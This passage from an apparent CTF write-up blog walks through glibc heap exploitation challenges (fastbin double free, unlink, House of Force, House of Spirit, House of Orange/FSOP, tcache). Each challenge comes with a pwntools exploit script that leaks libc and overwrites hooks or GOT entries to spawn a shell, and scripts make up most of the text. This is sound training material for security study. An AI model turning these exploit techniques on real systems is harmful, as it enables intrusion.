<img src='https://img.junyu33.me/blog/bin_ctf/heap2.png'>
<p>Using one_gadget:</p>
<img src='https://img.junyu33.me/blog/bin_ctf/one_gadget.png'>
<pre><code class="language-python">def exploit():
   add(2, 0x100, '2')
   add(3, 0x10, 'protected')
   free(2)
   show(2)

   addr = u64(p.recv(6).ljust(8, b'\0'))
   libc_base = addr - libc.sym['__malloc_hook'] - 112
   malloc_hook = libc_base + libc.sym['__malloc_hook'] 
   one_gadget = libc_base + 0x4526a

   add(0, 0x60, '0')
   free(0)
   edit(0, p64(malloc_hook - 0x23))

   add(1, 0x60, '1')
   add(2, 0x60, b'2'*0x13 + p64(one_gadget))
   add(4, 0x60, '4')
</code></pre>
<h3 id="babyheap-0ctf-2017-â€”-Fastbin-Attack">babyheap_0ctf_2017 â€” Fastbin Attack</h3>
<blockquote>
<p>Cannot be reproduced locally in <code>ubuntu18/libc2.26</code> and above, GDB debugging is not possible, so heap/stack diagrams are not included.</p>
<p>Reason: <code>libc2.26</code> introduced the <code>tcache</code> mechanism.</p>
<p>Solution: Use patchelf or <code>io = process([ld_path, elf_path], env=&#123;'LD_PRELOAD':libc_path&#125;)</code></p>
</blockquote>
<p><code>Fastbin Attack</code></p>
<p><code>Vulnerability: Fill with arbitrary size</code></p>
<p><code>Type: Double Free</code></p>
<pre><code class="language-python">def exploit():
    alloc(0x18) #0
    alloc(0x68) #1
    alloc(0x68) #2
    alloc(0x18) #3
    fill(0,0x19,'a'*0x18+'\xe1')
    free(1)
    alloc(0x68) #1
    dump(2)

    p.recvuntil('Content: \n')
    leak = u64(p.recvline()[:8])
    libc_base=leak-(0x7fc4a1902b78-0x7fc4a153e000) # GDB debug libc
    malloc_hook = libc_base + libc.symbols['__malloc_hook']
    onegadget=libc_base+0x4526a # one_gadget

    alloc(0x68) #4
    free(2)
    fill(4,0x8,p64(malloc_hook-0x23)) # To satisfy the condition that the last 3 bits of the size are all '1's, it's '\x7f' here.
    alloc(0x68) #2
    alloc(0x68) #5
    fill(5,0x1b,'a'*0x13+p64(onegadget))
    alloc(0x18)
    p.interactive()
</code></pre>
<h3 id="ZJCTF-2019-EasyHeapâ€”Fastbin-Double-Free">[ZJCTF 2019]EasyHeapâ€”Fastbin Double Free</h3>
<p>This heap challenge is slightly easier than the 0ctf2017 heap problem, as it does not require leaking the <code>__malloc_hook</code> function.</p>
<pre><code class="language-python">def exploit():
   Alloc(0x18, '0')
   Alloc(0x68, '1')
   Alloc(0x68, '2')
   Alloc(0x18, '3')
   Edit(0, 0x19, 'a'*0x18 + '\xe1')
   Free(1)

   magic = 0x6020ad
   Alloc(0x68, '1')
   Alloc(0x68, '4') # 2

   Free(2)
   Edit(4, 8, p64(magic))
   Alloc(0x68, '2')
   Alloc(0x68, '5')
   Edit(5, 8, '12345678')

   io.sendline('4869')
</code></pre>
<h3 id="babyfengshui-33c3-2016">babyfengshui_33c3_2016</h3>
<p><code>Partial RELRO</code>, allowing modification of the GOT and PLT tables.</p>
<p>Program timeout restriction removedâ€”replaced the <code>alarm</code> function with the <code>isnan</code> function.</p>
<pre><code class="language-bash">sed -i s/alarm/isnan/g ./ProgrammName
</code></pre>
<ol>
<li>Bypass the length check by separating the name chunk from the description chunk.</li>
<li>Overflow the 0th chunk and write <code>free.got</code> into the 1st chunk to leak the libc version.</li>
<li>Change <code>free.got</code> to <code>system.got</code>.</li>
<li>Obtain a shell by freeing the second chunk containing <code>/bin/sh</code>.</li>
</ol>
<pre><code class="language-python">def exploit():
   Add(0x80, 0x80, 'a')
   Add(0x80, 0x80, 'b')
   Add(0x8, 0x8, '/bin/sh\0')

   Del(0)
   Add(0x100, 0x19c, b'a'*0x198 + p32(elf.got['free']))
   Dis(1)
   io.recvuntil('description: ')
   free_addr = u32(io.recv(4))
    
   libc_base = free_addr - libc.sym['free']
   log.success('libc_base-&gt;'+hex(libc_base))
   sys = libc_base + libc.sym['system']
   Upd(1, 4, p32(sys))
    
   Del(2)
</code></pre>
<h3 id="hitcontraining-heapcreator-Off-by-One-Chunk-Overlapping">hitcontraining_heapcreator - Off by One + Chunk Overlapping</h3>
<p>First, use a heap overflow to modify the size field at 0xe5548 from 0x21 to 0x41, achieving an off-by-one overflow.</p>
<p>Observe the heap layout after deletion and reallocation.</p>
<p>After deletion, two fastbins are formed at 0xe5540 and 0xe55060.</p>
<img src='https://img.junyu33.me/blog/bin_ctf/image-20220801122000060.png'>
<p>Then, after reallocating, a 0x20 chunk will be allocated at 0xe55060, along with a 0x40 chunk at 0xe55040.</p>
<p>At this point, the heap pointer of the 0x20 chunk can be directed to <code>free.got</code>, allowing <code>free.got</code> to be overwritten with <code>libc.sys</code>. Then, freeing the chunk containing <code>/bin/sh</code> will execute a shell.</p>
<img src='https://img.junyu33.me/blog/bin_ctf/image-20220801123251259.png'>
<pre><code class="language-python">def exploit():
   add(0x18, 'aaaaaa')
   add(0x18, 'bbbbbb')
   edit(0, b'/bin/sh\0'+b'a'*0x10+b'\x41')
   add(0x38, 'protected')
   delete(1)
   add(0x30, p64(0)*4 + p64(0x30) + p64(elf.got['free']))

   libc_base = u64(show(1).ljust(8, b'\x00')) - libc.sym['free']
   libc_sys = libc_base + libc.sym['system']

   edit(1, p64(libc_sys))
   delete(0)
</code></pre>
<h3 id="roarctf-2019-easy-pwnâ€”off-by-one-realloc-hook">roarctf_2019_easy_pwnâ€”off by one+realloc_hook</h3>
<p>Due to the stack environment, it is necessary to use <code>realloc_hook+4</code> to satisfy the conditions of the <code>one_gadget</code>.</p>
<p>The principle is to adjust the number of pushes so that <code>[rsp+0x70]</code> aligns exactly with a null position.</p>
<p>As shown below, set a breakpoint in gdb at the calloc(realloc_hook+4) function, and run to this point to examine the values near [rsp+0x70]:</p>
<pre><code class="language-c">pwndbg&gt; x/16gx $rsp+0x70
0x7fff9700beb8: 0x000055e7e5e011ec      0x0000000000000000
0x7fff9700bec8: 0x6acb57d5bd5773a9      0x000055e7e5e009a0
0x7fff9700bed8: 0x00007fff9700bf70      0x0000000000000000
0x7fff9700bee8: 0x0000000000000000      0x3efbb214e59773a9
0x7fff9700bef8: 0x3f549cd4b72773a9      0x0000000000000000
0x7fff9700bf08: 0x0000000000000000      0x0000000000000000
0x7fff9700bf18: 0x00007fff9700bf88      0x00007f2800bda168
0x7fff9700bf28: 0x00007f28009c380b      0x0000000000000000
</code></pre>
<p>The assembly of <code>__libc_realloc</code> is as follows. It may require several attempts to find the correct jump address.</p>
<pre><code class="language-asm">pwndbg&gt; disass __libc_realloc                                                          
Dump of assembler code for function __GI___libc_realloc:                               
   0x00007f15184fae80 &lt;+0&gt;:     endbr64                                                
   0x00007f15184fae84 &lt;+4&gt;:     push   r15                                             
   0x00007f15184fae86 &lt;+6&gt;:     push   r14                                             
   0x00007f15184fae88 &lt;+8&gt;:     push   r13                                             
   0x00007f15184fae8a &lt;+10&gt;:    push   r12                                             
   0x00007f15184fae8c &lt;+12&gt;:    mov    r12,rsi                                         
   0x00007f15184fae8f &lt;+15&gt;:    push   rbp                                             
   0x00007f15184fae90 &lt;+16&gt;:    mov    rbp,rdi                                         
   0x00007f15184fae93 &lt;+19&gt;:    push   rbx                                             
   0x00007f15184fae94 &lt;+20&gt;:    sub    rsp,0x18  
</code></pre>
<p>Local exploit code (change 0xf1247 to 0xf1147 for remote).</p>
<pre><code class="language-python">def exploit():
   add(0x18) #0
   add(0x18) #1
   add(0xa8) #2
   add(0x18) #3
   edit(0, 0x18+10, b'/bin/sh\0'+b'\0'*0x10+b'\x41')
   edit(2, 0x19, b'\0'*0x18+b'\x91')
   edit(3, 9, 'protected')

   free(1)
   add(0x38)
   edit(1, 0x20, p64(0)*3 + p64(0xb1))
   free(2)

   libc_base = u64(show(1))- libc.sym['__malloc_hook'] - 0x68
   print(hex(libc_base))
   malloc_hook = libc_base + libc.sym['__malloc_hook']
   realloc_hook = libc_base + libc.sym['realloc'] 
   one_gadget = libc_base + 0xf1247
   add(0xa8)

   add(0x28) #4
   add(0x28) #5
   add(0x68) #6
   add(0x28) #7
   edit(4, 0x28+10, b'\0'*0x28 + b'\xa1')
   free(5)
   add(0x98)

   edit(5, 0x30, p64(0)*5 + p64(0x71))
   free(6)
   edit(5, 0x38, p64(0x12345678)*4 + p64(0) + p64(0x71) + p64(malloc_hook - 0x23))

   add(0x68) #6
   add(0x68) #7
   edit(8, 0x1b, b'a'*11 + p64(one_gadget) + p64(realloc_hook+4))
   add(0x68)
</code></pre>
<h3 id="hitcon-stkofâ€”unlink">hitcon_stkofâ€”unlink</h3>
<p>For the unlink part, the fake_chunk is constructed with the following formula:</p>
<ul>
<li>
<p>ptr points to the stack data area: <code>fake_pre_size(0) + fake_size(1) + ptr-0x18 + ptr-0x10</code></p>
</li>
<li>
<p>The next chunk's <code>pre_size</code> is <code>fake_size(0)</code>, and size is <code>size(0)</code>.</p>
</li>
<li>
<p>Here, <code>(0)</code> and <code>(1)</code> represent the <code>prev_inuse</code> bit.</p>
</li>
</ul>
<p>For the leak puts part, unlink modifies the control pointer to the GOT table, and the edit function effectively modifies values inside the GOT table. At this point, free(2) is equivalent to <code>elf.plt['puts'](elf.got['puts'])</code>, thereby printing the address of <code>libc_puts</code> to obtain <code>libc_base</code>.</p>
<p>The method for getting a shell is similar to leaking puts.</p>
<pre><code class="language-python">def exploit():
   # unlink
   add(0x18) #1 0x602148
   add(0x38) #2
   add(0x88) #3
   add(0x18) #4
   fake_chunk = p64(0)+p64(0x31)+p64(buf_ptr-0x18)+p64(buf_ptr-0x10)
   fake_chunk = fake_chunk.ljust(0x30, b'\x00')+p64(0x30)+p64(0x90)
   edit(2, len(fake_chunk), fake_chunk)
   free(3)
   #leak puts
   payload = p64(0)*2+p64(elf.got['free'])+p64(elf.got['puts'])
   edit(2, len(payload), payload)
   edit(1, 8, p64(elf.plt['puts']))
   free(2)
   #get libc
   libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.symbols['puts']
   libc_sys = libc_base + libc.sym['system']
   #getshell
   edit(1, 8, p64(libc_sys))
   edit(4, 8, '/bin/sh\0')
   free(4)
</code></pre>
<h3 id="hitcontraining-bambooboxâ€”unlink-house-of-force">hitcontraining_bambooboxâ€”unlink/house of force</h3>
<p>This challenge involves a trailing null byte when creating and editing strings (an off-by-null, which also becomes a debugging obstacle), but the main vulnerability is a heap overflow.</p>
<p>Unlink solution (without using the provided backdoor):</p>
<pre><code class="language-python">def exploit():
   buf_ptr = 0x6020d8
   add(0x18, 'aaaa') #0 0x6020c8
   add(0x38, 'bbbb') #1 0x6020d8
   add(0x88, 'cccc') #2
   add(0x18, '/bin/sh\0') #3
   fake_chunk = p64(0)+p64(0x31)+p64(buf_ptr-0x18)+p64(buf_ptr-0x10)
   fake_chunk = fake_chunk.ljust(0x30, b'\x00')+p64(0x30)+p64(0x90)
   edit(1, len(fake_chunk)-1, fake_chunk[:-1]) # fuck off the rear zero!
   free(2)
   
   payload = p64(0x18)+p64(elf.got['free'])+p64(0x38)+p64(buf_ptr-0x18)+p64(0x88)+p64(elf.got['puts'])
   edit(1, len(payload)-1, payload[:-1])
   edit(0, 7, p64(elf.plt['puts'])[:-1])
   free(2)

   libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.symbols['puts']
   libc_sys = libc_base + libc.sym['system']
   print(hex(libc_base))

   edit(0, 7, p64(libc_sys)[:-1])
   free(3)
</code></pre>
<p>Since it uses libc 2.27 or below, the House of Force solution is also feasible. This method replaces the address of <code>goodbye_message</code> with the address of <code>magic</code>, thereby reading the flag from a specified path upon exit:</p>
<pre><code class="language-python">def exploit():
   magic = 0x400d49

   add(0x38, b'aaaa')
   edit(0, 0x40, b'c'*0x38+p64(0xffffffffffffffff))

   offset_to_heap_base = -(0x40+0x20)
   malloc_size = offset_to_heap_base - 0x8 - 0xf
   add(malloc_size, 'dddd')
   add(0x10, p64(0)+p64(magic))

   io.sendline('5')
</code></pre>
<p>Regarding the constants 0x8 and 0xf:</p>
<blockquote>
<p>We need to ensure that <code>request2size</code> converts to the corresponding size exactly, meaning we need to make ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK equal to -4112. First, it is clear that -4112 is chunk-aligned, so we only need to subtract SIZE_SZ and MALLOC_ALIGN_MASK from it to get the required allocation value.</p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-force/#1">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-force/#1</a></p>
</blockquote>
<pre><code class="language-c">#ifndef INTERNAL_SIZE_T
#define INTERNAL_SIZE_T size_t
#endif

/* The corresponding word size */
#define SIZE_SZ                (sizeof(INTERNAL_SIZE_T))


/*
  MALLOC_ALIGNMENT is the minimum alignment for malloc'ed chunks.
  It must be a power of two at least 2 * SIZE_SZ, even on machines
  for which smaller alignments would suffice. It may be defined as
  larger than this though. Note however that code and data structures
  are optimized for the case of 8-byte alignment.
*/


#ifndef MALLOC_ALIGNMENT
# if !SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_16)
/* This is the correct definition when there is no past ABI to constrain it.

   Among configurations with a past ABI constraint, it differs from
   2*SIZE_SZ only on powerpc32.  For the time being, changing this is
   causing more compatibility problems due to malloc_get_state and
   malloc_set_state than will returning blocks not adequately aligned for
   long double objects under -mlong-double-128.  */

#  define MALLOC_ALIGNMENT       (2 *SIZE_SZ &lt; __alignof__ (long double)      \
                                  ? __alignof__ (long double) : 2 *SIZE_SZ)
# else
#  define MALLOC_ALIGNMENT       (2 *SIZE_SZ)
# endif
#endif

/* The corresponding bit mask value */
#define MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)

/* The smallest size we can malloc is an aligned minimal chunk */
#define MINSIZE  \
  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))

/* pad request bytes into a usable size -- internal version */

#define request2size(req)                                         \
  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \
   MINSIZE :                                                      \
   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)
</code></pre>
<h3 id="lctf2016-pwn200â€”House-of-Spirit">lctf2016_pwn200â€”House of Spirit</h3>
<blockquote>
<p>The main points of the House of Spirit technique include:</p>
<ul>
<li>Targets fastbins;</li>
<li>The <code>ISMMAP</code> bit in the constructed size field must not be 1;</li>
<li>The pointer must point to the data area of the previous chunk;</li>
<li>The distance between the chunk and the next chunk is the size of the previous chunk.</li>
</ul>
</blockquote>
<p>The stack frame layout is as shown (top is <code>func 0x400a29</code>, middle is <code>func 0x400a8e</code>, bottom is the main function):</p>
<img src='https://img.junyu33.me/blog/bin_ctf/image-20220809135423840-16600244900701.png'>
<p>Note that the return value of the <code>getid</code> function at the end of <code>func 0x400a8e</code> is also important:</p>
<pre><code class="language-assembly">.text:0000000000400B24 48 98                         cdqe
.text:0000000000400B26 48 89 45 C8                   mov     [rbp+var_38], rax
.text:0000000000400B2A B8 00 00 00 00                mov     eax, 0
.text:0000000000400B2F E8 F5 FE FF FF                call    sub_400A29
.text:0000000000400B2F
.text:0000000000400B34 C9                            leave
.text:0000000000400B35 C3                            retn
</code></pre>
<p>It stores the return value at <code>rbp-0x38</code>, which is the size field of the constructed next chunk.</p>
<pre><code class="language-python">def exploit():
   io.recvuntil('who are u?')
   io.send(shellcode.ljust(48, b'a'))
   rbp = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\0'))  # the start of line 13

   fake_addr = rbp - 0x90  # the start of line 4
   shellcode_addr = rbp - 0x50  # the start of line 8

   io.recvuntil('id ~~?')
   io.sendline('48')  # store at [rbp - 0x38]
   io.recvuntil('money~')

   payload = p64(0)*5 + p64(0x40)
   payload = payload.ljust(0x38, b'\0') + p64(fake_addr)  # overlap the heap pointer to fake_addr
   io.send(payload)  # fill the fake_chunk

   io.recvuntil('choice : ')
   io.sendline('2')  # free the fake_chunk
   io.recvuntil('choice : ')
   io.sendline('1')
   io.sendline('48')  # alloc again, must be (fake_chunk size - 0x10)

   payload = b'a'*0x18 + p64(shellcode_addr)  # overflow 0x400a8e to shellcode_addr
   io.send(payload)

   io.sendline('3')
</code></pre>
<h3 id="houseoforange-hitcon-2016â€”unsortedbin-attack-FSOP">houseoforange_hitcon_2016â€”unsortedbin attack + FSOP</h3>
<blockquote>
<p>In the original <code>edit</code> function, there is no length check, allowing for heap overflow. There are also restrictions on the number of <code>add</code> and <code>edit</code> operations.</p>
</blockquote>
<p>Regarding the <code>FILE</code> structure:</p>
<pre><code class="language-c">struct _IO_FILE &#123;
  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */
#define _IO_file_flags _flags

  /* The following pointers correspond to the C++ streambuf protocol. */
  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */
  char* _IO_read_ptr;   /* Current read pointer */
  char* _IO_read_end;   /* End of get area. */
  char* _IO_read_base;  /* Start of putback+get area. */
  char* _IO_write_base; /* Start of put area. */
  char* _IO_write_ptr;  /* Current put pointer. */
  char* _IO_write_end;  /* End of put area. */
  char* _IO_buf_base;   /* Start of reserve area. */
  char* _IO_buf_end;    /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */

  struct _IO_marker *_markers;

  struct _IO_FILE *_chain;

  int _fileno;
#if 0
  int _blksize;
#else
  int _flags2;
#endif
  _IO_off_t _old_offset; /* This used to be _offset but it's too small.  */

#define __HAVE_COLUMN /* temporary */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];

  /*  char* _save_gptr;  char* _save_egptr; */

  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
&#125;;
struct _IO_FILE_complete
&#123;
  struct _IO_FILE _file;
#endif
#if defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001
  _IO_off64_t _offset;
# if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data;
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
# else
  void *__pad1;
  void *__pad2;
  void *__pad3;
  void *__pad4;

  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
#endif
&#125;;

</code></pre>
<p>To call <code>IO_overflow</code>, several conditions must be met:</p>
<ul>
<li><code>fp-&gt;_mode &lt;= 0</code></li>
<li><code>fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</code></li>
</ul>
<p>Therefore, the conditions can be satisfied by setting <code>FILE[5] = 1, FILE[4] = 0</code>, and setting all bytes after <code>FILE[5]</code> to 0.</p>
<p>Then, by forging the vtable of <code>_IO_list_all</code> and overwriting the <code>__overflow</code> field with <code>libc_sys</code>, the exploit can be achieved.</p>
<p><img src="https://p1.ssl.qhimg.com/t0188be5fd97225b497.png" alt=""></p>
<p>Due to the addition of vtable checks in libc 2.27, this method is ineffective in libc 2.27.</p>
<pre><code class="language-python">def exploit():
   add(0x18, 'a')
   payload = b'a'*0x18 + p64(0x21)
   payload += p32(1) + p32(0xddaa) + p64(0)
   payload += p64(0) + p64(0xfa1) # the offset must be mutiples of 0x1000
   edit(len(payload), payload)
   add(0x1000, 'b')
   add(0x408, 'c') # only largebin have fd_nextsize &amp; bk_nextsize
   # the largebin's first 16 bytes are fd &amp; bk (i.e. main_arena+88), the next 16 bytes are fd_nextsize &amp; bk_nextsize
   show()
   libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x3c5163
   edit(16, 'd'*16)
   show()
   io.recvuntil('d'*16)
   heap_base = u64(io.recv(6).ljust(8, b'\x00')) - 0xc0
   log.success('libc_base: ' + hex(libc_base))
   log.success('heap_base: ' + hex(heap_base))
   libc_sys = libc_base + libc.sym['system']
   _IO_list_all = libc_base + libc.sym['_IO_list_all']

   payload = b'e'*0x408 + p64(0x21) 
   payload += b'a'*0x10
   fake_file = b'/bin/sh\0' + p64(0x60) # overflow the old_topchunk
   fake_file += p64(0) + p64(_IO_list_all-0x10) # unsorted bin attack
   fake_file += p64(0) + p64(1) # _IO_write_base &amp; _IO_write_ptr
   fake_file = fake_file.ljust(0xd8, b'\x00') + p64(heap_base + 0x5c8) # make vtable point itself
   payload += fake_file
   payload += p64(0)*2 + p64(libc_sys) # position of __overflow
   edit(0x800, payload)
   
   io.sendline('1')
</code></pre>
<h3 id="axb-2019-heapâ€”â€”fmtstr-off-by-one-unlink">axb_2019_heapâ€”â€”fmtstr+off by one+unlink</h3>
<p>A small integration of heap and format string vulnerabilities.</p>
<blockquote>
<p>Celebration for finishing the third page of buu~</p>
</blockquote>
<pre><code class="language-python">def exploit():
   # leak elf and libc by fmtstr
   payload = '%11$p%15$p'
   io.sendline(payload)
   io.recvuntil('Hello, ')
   elf_base = int(io.recv(14), 16) - 0x116a - 28
   libc_base = int(io.recv(14), 16) - libc.sym['__libc_start_main'] - 240
   # modify chunk1's prev_inuse to trigger unlink: ptr = node_add - 0x18
   note_add = elf_base + 0x202060
   add(0, 0x98, 'x')
   add(1, 0x98, 'y')
   add(2, 0x98, 'z')
   fake_chunk = p64(0)+p64(0x91)+p64(note_add-0x18)+p64(note_add-0x10)
   fake_chunk = fake_chunk.ljust(0x90, b'\0')+p64(0x90)+p8(0xa0)
   edit(0, fake_chunk)
   dele(1)
   # modify global variable to hijack __free_hook and getshell
   free_hook = libc_base + libc.sym['__free_hook']
   libc_sys = libc_base + libc.sym['system']
   edit(0, p64(0)*3+p64(free_hook)+p64(0x98)+p64(note_add+0x18)+b'/bin/sh\0')
   edit(0, p64(libc_sys))
   dele(1)
</code></pre>
<h3 id="zctf2016-note2â€”Integer-Overflow-Unlink">zctf2016_note2â€”Integer Overflow + Unlink</h3>
<p>There is an integer overflow vulnerability in the edit function:</p>
<pre><code class="language-c">unsigned __int64 __fastcall read_0(char *a1, __int64 len, char stop)
&#123;
  char buf; // [rsp+2Fh] [rbp-11h] BYREF
  unsigned __int64 i; // [rsp+30h] [rbp-10h]
  ssize_t v7; // [rsp+38h] [rbp-8h]

  for ( i = 0LL; len - 1 &gt; i; ++i ) // len=0
  &#123;
    v7 = read(0, &amp;buf, 1uLL);
    if ( v7 &lt;= 0 )
      exit(-1);
    if ( buf == stop )
      break;
    a1[i] = buf;
  &#125;
  a1[i] = 0;
  return i;
&#125;
</code></pre>
<p>exp:</p>
<pre><code class="language-python">def exploit():
   io.sendline('1')
   io.sendline('2')
   fake_chunk = p64(0)+p64(0xa1)+p64(buf-0x18)+p64(buf-0x10) # 0x90+0x20-0x10
   add(0x80, fake_chunk) #0
   add(0, '') #1, unlimited buffer size
   add(0x80, 'bbbbbbbb') #2

   dele(1)
   add(0, b'a'*0x10+p64(0xa0)+p64(0x90)) #1, chunk2's fake prev &amp; size
   dele(2)  

   edit(0, b'a'*0x18+p64(0x602138)) # change the ptr address itself to 4th ptr (chunk1) 
   edit(0, p64(elf.got['puts']))

   libc_base = u64(show(3).ljust(8, b'\0')) - libc.sym['puts']
   log.success('libc_base: '+hex(libc_base))
   free_hook = libc_base + libc.sym['__free_hook']
   libc_sys = libc_base + libc.sym['system']

   edit(0, p64(free_hook))
   edit(3, p64(libc_sys))

   edit(0, ';sh\0') # there is a free func in edit func
</code></pre>
<h3 id="gyctf-2020-forceâ€”House-of-Force-realloc-hook">gyctf_2020_forceâ€”House of Force + realloc_hook</h3>
<p>Initially, I directly overwrote <code>__malloc_hook</code> with a <code>one_gadget</code>, but it crashed again. (One-gadgets often fail...)</p>
<p>Then I switched to using <code>realloc</code>, and by randomly pushing a few registers, it worked.</p>
<p>You can refer to this master's article to understand the conditions required for exploiting <code>one_gadget</code>: <a target="_blank" rel="noopener" href="http://taqini.space/2020/04/29/about-execve/">http://taqini.space/2020/04/29/about-execve/</a></p>
<pre><code class="language-python">def exploit():
   libc_base = add(0x200000, b'1') - 0x10 + 0x201000
   libc_sys = libc_base + libc.sym['system']
   libc_realloc = libc_base + libc.sym['realloc']
   one_gadget = libc_base+0x4527a

   top_addr = add(0x18, b'a'*0x18+p64(0xffffffffffffffff)) + 0x20
   offset = libc_base + libc.sym['__malloc_hook'] - top_addr
   malloc_size = offset - 0x18 - 0xf
   # malloc_size = offset - 0x8 - 0xf

   add(malloc_size, 'padding')
   add(0x18, b'a'*8+p64(one_gadget)+p64(libc_realloc+12)) # 13 16 is also ok
   # add(0x18, p64(one_gadget))

   io.sendline('1')
   io.sendline('24')
</code></pre>
<p>This can also be verified here:</p>
<pre><code class="language-c">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
00:0000â”‚ rsp 0x7ffca061dcb0 â€”â–¸ 0x7f5c811ef95f (realloc+591) â—‚â€” mov    rbp, rax
01:0008â”‚     0x7ffca061dcb8 â€”â–¸ 0x5620ac402060 â—‚â€” '24\n36947911353\n'
02:0010â”‚     0x7ffca061dcc0 â—‚â€” 0x4
03:0018â”‚     0x7ffca061dcc8 â—‚â€” 0x0
04:0020â”‚     0x7ffca061dcd0 â€”â–¸ 0x7ffca061de20 â€”â–¸ 0x7ffca061df50 â€”â–¸ 0x5620ac200cf0 â—‚â€” push   r15
05:0028â”‚     0x7ffca061dcd8 â€”â–¸ 0x5620ac2008f0 â—‚â€” xor    ebp, ebp
06:0030â”‚ rsi 0x7ffca061dce0 â€”â–¸ 0x7ffca061e030 â—‚â€” 0x1
07:0038â”‚     0x7ffca061dce8 â—‚â€” 0x0
</code></pre>
<h3 id="zctf-2016-note3â€”int-overflow-unlink-no-show">zctf_2016_note3â€”int overflow+unlink+no show</h3>
<p>Similar to note2, first perform a heap overflow followed by an unlink, then modify the heap pointer to <code>free.got</code> and edit it to <code>puts.plt</code>.</p>
<p>Take the GOT of any function (e.g., atoi), free it to leak the libc address. Finally, use <code>one_gadget</code> or <code>system</code> to modify <code>atoi.got</code> and <code>free.got</code>.</p>
<pre><code class="language-python">def exploit():
   # unlink part is omitted
   edit(0, b'a'*0x10+p64(buf-0x18)*2+p64(0)+p64(elf.got['free'])+p64(elf.got['atoi']))
   edit(2, p64(elf.plt['puts'])[:-1])
   dele(3)

   libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))-libc.sym['atoi']
   one_gadget = libc_base+0x4526a

   edit(2, p64(one_gadget)[:-1])
   dele(0)
</code></pre>
<h2 id="libc-2-27">libc 2.27</h2>
<h3 id="libc-2-27-UAF-buu-n1book-note">libc 2.27 UAF (buu-n1book: note)</h3>
<p>There are obvious Use-After-Free (UAF) and Double Free vulnerabilities.</p>
<p>The approach is to fill up the tcache first and then perform a conventional unsorted bin attack.</p>
<pre><code class="language-python">def exploit():
   add(0x90, 'aaaaaaaa')
   add(0x90, 'bbbbbbbb')
   add(0x90, '/bin/sh\0')

   for i in range(7):
      free(0)
   free(1)
   show(1)
   addr = u64(p.recv(6).ljust(8, b'\0'))

   libc_base = addr - libc.sym['__malloc_hook'] - 112
   libc_sys = libc_base + libc.sym['system']
   libc_free = libc_base + libc.sym['__free_hook']

   edit(0, p64(libc_free))
   add(0x90, p64(libc_sys)) #??????
   add(0x90, p64(libc_sys))
   free(2)
</code></pre>
<p>Alternatively, using tcache_dup:</p>
<pre><code class="language-python">add(0x30,'aaa\n')#0
add(0x30,'bbb\n')#1
add(0x450,'xxxx\n')#2
add(0x30,'/bin/sh\n')#3
free(2)
addr = u64(show(2).ljust(8,'\x00'))

libc_base = addr - libc.sym['__malloc_hook'] - 112
libc_sys = libc_base + libc.sym['system']
libc_free = libc_base + libc.sym['__free_hook']

free(1)
free(0)
free(0)
edit(0,p64(free_hook)+'\n')
add(0x30,p64(system)+'\n')
add(0x30,p64(system)+'\n')
dele(3)
</code></pre>
<h3 id="ciscn-2019-n-3-â€”-Heap-Fengshui">ciscn_2019_n_3 â€” Heap Fengshui</h3>
<p>Some write-ups claim this is a fastbin attack, but in reality, this challenge involves tcache (libc 2.27) heap fengshui and has nothing to do with fastbins.</p>
<pre><code class="language-python">def exploit():
   add(0, 0x40, 'aaaa')
   add(1, 0x40, 'bbbb')
   free(0)
   free(1)
   add(2, 0xc, b'sh\0\0'+p32(elf.plt['system']))
   free(0)
</code></pre>
<p>After the first four lines of the exploit, the heap layout is as follows:</p>
<pre><code class="language-c">0x955e160       0x00000000      0x08048725      ....%...         &lt;-- tcachebins[0x10][1/2]
0x955e168       0x0955e170      0x00000051      p.U.Q...
0x955e170       0x00000000      0x0000000a      ........         &lt;-- tcachebins[0x30][1/2]
0x955e178       0x00000000      0x00000000      ........
0x955e180       0x00000000      0x00000000      ........
0x955e188       0x00000000      0x00000000      ........
0x955e190       0x00000000      0x00000000      ........
0x955e198       0x00000000      0x00000000      ........
